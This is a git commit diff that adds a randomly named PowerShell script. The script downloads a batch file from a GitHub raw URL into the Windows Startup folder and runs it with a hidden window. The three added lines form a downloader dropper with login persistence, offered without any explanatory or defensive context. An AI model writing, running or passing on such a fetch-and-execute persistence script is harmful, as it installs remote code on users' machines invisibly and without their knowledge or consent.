59f9bdf6b05aaeb31d75166471023224d1aad050
h2dra <stample761@gmail.com>
2025-02-16 12:32:14 +0000

    Create 1e8ge1ypesmq.ps1

---
+++ 1e8ge1ypesmq.ps1
@@ -0,0 +1,3 @@
+$scriptPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\4j432y43p48j143.bat"
+Invoke-WebRequest -Uri "https://raw.githubusercontent.com/h2dra/h3d863diw52db2d31/main/4j432y43p48j143.bat" -OutFile $scriptPath
+Start-Process -FilePath $scriptPath -WindowStyle Hidden
